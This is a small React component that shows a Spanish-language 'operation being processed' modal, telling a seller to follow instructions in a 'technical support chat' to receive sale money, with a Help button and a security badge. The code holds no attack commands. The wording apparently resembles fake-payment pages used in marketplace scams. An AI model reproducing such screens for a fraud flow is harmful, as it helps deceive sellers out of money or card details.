import { SecurityBadge } from '../components/badges/SecurityBadge'
import { Button } from '../components/ui/buttons/Button'
import { useChatStore } from '../stores/useChatStore'
import Spinner from '/src/assets/icons/Spinner.svg?react'

export function LoadingModal() {
  const { openChat } = useChatStore()

  return (
    <div className="flex h-full flex-col items-center rounded-2xl border border-black/20 bg-white px-6 py-10 font-system">
      <Spinner className="mb-[20px] h-[60px] w-[60px]" />
      <h1 className="mb-3 text-center text-lg font-semibold leading-[22px]">La operación está siendo procesada</h1>
      <h2 className="mb-[18px] max-w-[250px] text-center text-sm font-medium text-black/70">
        Para recibir el dinero por la venta, sigue las instrucciones en el chat de apoyo técnico
      </h2>
      <Button title="Ayuda" className="mb-2.5 h-[42px] w-full max-w-[300px]" onClick={openChat} />
      <SecurityBadge />
    </div>
  )
}
